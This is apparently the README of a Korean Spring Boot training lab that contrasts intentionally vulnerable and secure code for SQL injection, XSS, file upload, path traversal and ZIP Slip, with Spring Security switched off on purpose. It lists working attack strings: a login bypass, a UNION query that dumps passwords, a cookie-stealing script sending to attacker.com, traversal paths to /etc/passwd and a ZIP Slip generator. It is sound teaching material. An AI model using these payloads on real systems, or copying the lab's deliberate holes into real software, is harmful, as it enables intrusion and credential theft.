# 시큐어코딩 — 웹 보안 취약점 실습 환경 (Spring Boot)

안전한 S/W 제작 기술 고도화 — 웹 보안 취약점 실습 환경

> JSP + Apache Tomcat 기반에서 **Spring Boot 3.2** 로 리팩토링.
> 각 취약점을 **취약한 코드 🔴** 와 **안전한 코드 🟢** 로 나란히 비교하며 실습할 수 있습니다.

---

## 빠른 시작

### 사전 요구 사항

- Java 17+
- Maven 3.8+
- MySQL 8.0+

### 1. 데이터베이스 생성

```sql
mysql -u root -p
CREATE DATABASE techseminar CHARACTER SET utf8mb4;
```

> `schema.sql` / `data.sql` 은 앱 시작 시 자동으로 실행됩니다.

### 2. DB 연결 설정 (필요 시 수정)

`src/main/resources/application.properties`

```properties
spring.datasource.url=jdbc:mysql://localhost:3306/techseminar?...
spring.datasource.username=root
spring.datasource.password=1234
```

### 3. 실행

```bash
mvn spring-boot:run
```

브라우저에서 `http://localhost:8080` 접속

### 테스트 계정

| 아이디 | 비밀번호 | 역할 |
|--------|----------|------|
| admin  | 1234     | 관리자 |
| alice  | 1234     | 일반 |
| bob    | 1234     | 일반 |
| melody | 1234     | 일반 |

---

## Spring Security를 비활성화한 이유

이 프로젝트에는 Spring Security가 포함되어 있지만 **의도적으로 전체 비활성화** 되어 있습니다.

```java
// SecurityConfig.java
http.csrf(disable)
    .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
    .formLogin(disable);
```

이유는 두 가지입니다.

**① SQL Injection 로그인 데모가 불가능해지기 때문**

Spring Security를 켜면 `/login` POST 요청을 Spring Security 필터가 먼저 가로챕니다.
`AuthController`의 취약한 로그인 코드(`loginVulnerable`)가 실행될 기회 자체가 사라집니다.
SQL Injection을 로그인 화면에서 직접 시연하려면 Spring Security의 인증 필터를 우회해야 합니다.

**② CSRF 보호가 데모 폼을 막기 때문**

Spring Security의 CSRF 보호를 켜면 모든 POST 폼에 CSRF 토큰이 필요합니다.
별도 설정 없이는 데모의 모든 폼이 `403 Forbidden`을 반환합니다.

### "그러면 Spring Security를 켜면 이 취약점들이 다 해결되는 건가요?"

**아닙니다.** 이것이 이 세미나의 핵심입니다.

Spring Security는 **"누가 어디에 접근할 수 있는가"** (인증·인가) 를 담당합니다.
이 세미나의 취약점들은 **"입력값을 코드에서 어떻게 처리하는가"** 의 문제입니다. 층이 다릅니다.

```
HTTP 요청
    ↓
[Spring Security 필터]  ← 인증/인가만 처리
    ↓ (통과)
[Controller / Service]  ← SQL Injection, XSS, 파일 업로드, 경로 순회는 여기서 발생
    ↓
DB / 파일시스템
```

Spring Security를 완전히 활성화해도, 로그인한 공격자가 검색창에 SQL을 입력하거나,
게시글에 `<script>`를 쓰거나, ZIP 파일 안에 `../../`를 넣으면 Spring Security는 이를 전혀 알지 못합니다.

| 취약점 | Spring Security ON | Spring Security OFF |
|--------|-------------------|---------------------|
| SQL Injection (PreparedStatement 미사용) | **여전히 취약** | 취약 |
| XSS (th:utext 사용) | **여전히 취약** | 취약 |
| 파일 업로드 (확장자 무검증) | **여전히 취약** | 취약 |
| 경로 순회 / ZIP Slip | **여전히 취약** | 취약 |
| SQL Injection 로그인 데모 실행 | **불가** (필터가 가로챔) | 가능 |
| CSRF 공격 | 방어됨 | 취약 |

> **프레임워크는 문을 잠가주지만, 문 안으로 들어온 사람이 무엇을 할 수 있는지는 개발자가 코드로 제어해야 합니다.**

---

## 취약점 데모

`http://localhost:8080/demo` 에서 전체 목록 확인 가능.

각 데모 페이지에서 공격 스크립트 옆 **복사 버튼**으로 바로 클립보드에 복사할 수 있습니다.

---

### 💉 SQL Injection — `/demo/sql-injection`

| 구분 | 내용 |
|------|------|
| OWASP | A03:2021 — Injection |
| CWE | CWE-89 |
| 취약 코드 | 문자열 붙이기: `"... WHERE user_id = '" + userId + "'"` |
| 안전 코드 | PreparedStatement: `"... WHERE user_id = ?"` + 파라미터 바인딩 |

**공격 예시**

- 로그인 우회: ID = `admin' --` / PW = 아무거나
- 전체 조회: 검색어 = `%' OR '1'='1`
- 계정 탈취: `%' UNION SELECT 1,user_id,user_password,user_name,user_email,user_gender,0 FROM user_tb --`

---

### 📜 XSS (Cross-Site Scripting) — `/demo/xss`

| 구분 | 내용 |
|------|------|
| OWASP | A03:2021 — Injection |
| CWE | CWE-79 |
| 취약 코드 | `th:utext` — HTML 그대로 렌더링 |
| 안전 코드 | `th:text` — HTML 자동 인코딩 |

**공격 예시**

- 경고창 (Reflected): `<script>alert('XSS!')</script>`
- 쿠키 탈취 (Stored): `<script>fetch('http://attacker.com?c='+document.cookie)</script>`
- 이미지 태그 우회: `<img src=x onerror="alert('XSS')">`

**데모 유형**

- **Stored XSS**: 댓글 입력 → 저장 → 모든 사용자 조회 시 실행
- **Reflected XSS**: URL 파라미터 → 즉시 출력

---

### 📁 파일 업로드 취약점 — `/demo/file-upload`

| 구분 | 내용 |
|------|------|
| OWASP | A04:2021 — Insecure Design |
| CWE | CWE-434, CWE-22 (ZIP Slip) |
| 취약 코드 | 확장자 검사 없음, 원본 파일명 그대로 저장 |
| 안전 코드 | 화이트리스트 검사 + UUID 랜덤 파일명 |

**공격 파일 유형 (Spring Boot 환경 기준)**

| 파일 | 설명 | 동작 조건 |
|------|------|-----------|
| `webshell.jsp` | 서버 명령 실행 | `tomcat-embed-jasper` 의존성 필요 (기본 없음) |
| `shell.groovy` | Groovy 스크립트 실행 | 서버에 Groovy 실행 로직 필요 |
| `backdoor.sh` | Linux 역방향 쉘 | cron / Path Traversal과 결합 시 유효 |
| `payload.svg` | 브라우저 XSS | 파일을 직접 열 때 실행 |
| `zipslip.zip` | 임의 경로 파일 쓰기 | ZIP 해제 기능이 있는 서버 |

**ZIP Slip — 화이트리스트를 통과한 .zip도 위험한 이유**

```python
# 악성 ZIP 생성 (Python)
import zipfile
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('../../uploads/pwned.txt', 'ZIP Slip success!')
zf.writestr('normal.txt', 'normal file')
zf.close()
```

ZIP Slip 취약/안전 해제 데모는 `/demo/file-upload` 하단에서 직접 실습 가능합니다.

---

### 🗂️ 경로 순회 (Path Traversal) — `/demo/path-traversal`

| 구분 | 내용 |
|------|------|
| OWASP | A01:2021 — Broken Access Control |
| CWE | CWE-22 |
| 기준 경로 | `./safe-files/` |
| 취약 코드 | `safeFilesDir + "/" + filename` (검증 없음) |
| 안전 코드 | `normalize()` + `startsWith(basePath)` 로 탈출 감지 |

**공격 예시**

- `../src/main/resources/application.properties` — DB 비밀번호 노출
- `../../pom.xml` — 프로젝트 구조 노출
- `../../../Windows/win.ini` — Windows 시스템 파일
- `../../../etc/passwd` — Linux 계정 정보

---

## 프로젝트 구조

```
src/main/java/com/techseminar/
├── config/
│   └── SecurityConfig.java          CSRF 비활성화, 전체 접근 허용 (데모 목적)
├── controller/
│   ├── AuthController.java          로그인 / 로그아웃 / 회원가입
│   ├── BbsController.java           게시판 CRUD + 검색
│   ├── HomeController.java
│   └── demo/
│       ├── SqlInjectionController.java
│       ├── XssController.java
│       ├── FileUploadDemoController.java  (기본 업로드 + ZIP Slip 데모)
│       └── PathTraversalController.java
├── model/
│   ├── User.java
│   ├── Bbs.java
│   └── FileInfo.java
└── service/
    ├── UserService.java             loginVulnerable / loginSecure
    ├── BbsService.java              searchVulnerable / searchSecure
    └── FileService.java             uploadVulnerable / uploadSecure
                                     extractVulnerable / extractSecure (ZIP Slip)

src/main/resources/
├── application.properties
├── schema.sql                       테이블 생성 (앱 시작 시 자동 실행)
├── data.sql                         샘플 데이터 (앱 시작 시 자동 실행)
├── static/style.css
└── templates/
    ├── index.html
    ├── auth/                        login.html, signup.html
    ├── bbs/                         list, view, write, edit, search
    ├── demo/                        index, sql-injection, xss, file-upload, path-traversal
    └── fragments/                   head.html, navbar.html

safe-files/                          경로 순회 데모용 기준 디렉토리
```

---

## 기술 스택

| 항목 | 버전 |
|------|------|
| Java | 17 |
| Spring Boot | 3.2.3 |
| Thymeleaf | 3.x |
| Spring JDBC | — |
| Spring Security | 6.x (전체 비활성화 — 데모 목적, 위 설명 참조) |
| MySQL | 8.0+ |
| Bootstrap | 5.3 (CDN) |

---

## 보안약점 목록

| CWE | 취약점 | 데모 위치 |
|-----|--------|-----------|
| CWE-89 | SQL Injection | `/demo/sql-injection` |
| CWE-79 | XSS — Stored / Reflected | `/demo/xss` |
| CWE-434 | 위험한 형식 파일 업로드 | `/demo/file-upload` |
| CWE-22 | 경로 순회 (Path Traversal) | `/demo/path-traversal` |
| CWE-22 | ZIP Slip | `/demo/file-upload` (하단) |

